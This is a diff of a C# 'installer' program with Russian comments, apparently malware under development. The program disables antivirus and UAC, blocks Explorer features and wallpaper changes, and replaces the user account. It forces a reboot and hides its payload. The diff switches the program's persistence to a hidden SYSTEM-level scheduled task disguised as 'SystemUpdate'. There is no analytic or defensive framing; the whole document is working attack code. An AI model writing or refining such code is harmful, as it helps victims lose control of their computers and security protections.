@@ -1,4 +1,4 @@
-// installer.cs - Полная версия, правильный порядок (БЕЗ перезаписи LogonUI)
+// installer.cs
 using System;
 using System.IO;
 using System.Security.AccessControl;
@@ -43,17 +43,17 @@ namespace LogonUIInstaller
                 // 1. БЛОКИРОВКИ
                 ApplySystemBlocks();
 
-                // 2. ЗАМЕНА ОБОЕВ И КУРСОРОВ
-                ReplaceWallpaperAndCursors();
-
-                // 3. ОТКЛЮЧЕНИЕ АНТИВИРУСОВ И UAC
+                // 2. ОТКЛЮЧЕНИЕ АНТИВИРУСОВ И UAC
                 DisableAntivirusAndUAC();
+
+                // 3. ЗАМЕНА ОБОЕВ И КУРСОРОВ (СНАЧАЛА ЗАМЕНА, ПОТОМ БЛОКИРОВКА)
+                ReplaceWallpaperAndCursors();
 
                 // 4. УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЯ
                 ReplaceUserAccount();
 
-                // 5. АВТОЗАГРУЗКА (создаёт запись на запуск MainInterface)
-                AddToStartup();
+                // 5. АВТОЗАГРУЗКА (через Task Scheduler, чтобы форма запускалась ДО входа)
+                AddToStartupTaskScheduler();
 
                 // 6. ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА
                 ForceReboot();
@@ -178,17 +178,7 @@ namespace LogonUIInstaller
                     key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                 }
 
-                // Запрет изменения обоев
-                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
-                {
-                    key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
-                }
-
-                // Запрет создания новых пользователей
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
-                {
-                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
-                }
+                // Запрет изменения обоев (установим ПОСЛЕ замены, в методе ReplaceWallpaperAndCursors)
             }
             catch { }
         }
@@ -229,6 +219,7 @@ namespace LogonUIInstaller
                 ExtractResource("wd.webp", Path.Combine(targetDir, "wd.webp"));
                 ExtractResource("fg.ani", Path.Combine(targetDir, "fg.ani"));
 
+                // СНАЧАЛА УСТАНАВЛИВАЕМ ОБОИ
                 using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop"))
                 {
                     key.SetValue("Wallpaper", Path.Combine(targetDir, "wd.webp"), RegistryValueKind.String);
@@ -236,6 +227,7 @@ namespace LogonUIInstaller
                     key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                 }
 
+                // УСТАНАВЛИВАЕМ КУРСОРЫ
                 string cursorPath = Path.Combine(targetDir, "fg.ani");
                 using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"))
                 {
@@ -253,6 +245,18 @@ namespace LogonUIInstaller
                     key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
                     key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
                     key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
+                }
+
+                // ПОСЛЕ ЗАМЕНЫ СТАВИМ БЛОКИРОВКУ ИЗМЕНЕНИЯ ОБОЕВ
+                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
+                {
+                    key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
+                }
+
+                // ЗАПРЕТ СОЗДАНИЯ НОВЫХ ПОЛЬЗОВАТЕЛЕЙ
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
+                {
+                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                 }
             }
             catch { }
@@ -303,7 +307,7 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        private static void AddToStartup()
+        private static void AddToStartupTaskScheduler()
         {
             try
             {
@@ -321,18 +325,15 @@ namespace LogonUIInstaller
                 File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                 File.SetAttributes(targetDir, FileAttributes.Hidden | FileAttributes.ReadOnly);
 
-                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
+                // СОЗДАЁМ ЗАДАНИЕ В ПЛАНИРОВЩИКЕ (запуск ДО входа пользователя)
+                Process.Start(new ProcessStartInfo
                 {
-                    key.SetValue("SystemUpdate", destPath, RegistryValueKind.String);
-                }
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
-                {
-                    key.SetValue("SystemUpdate", destPath, RegistryValueKind.String);
-                }
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
-                {
-                    key.SetValue("SystemUpdate", destPath, RegistryValueKind.String);
-                }
+                    FileName = "schtasks",
+                    Arguments = $"/create /tn \"SystemUpdate\" /tr \"{destPath}\" /sc onstart /ru SYSTEM /rl HIGHEST /f",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
             }
             catch { }
         }
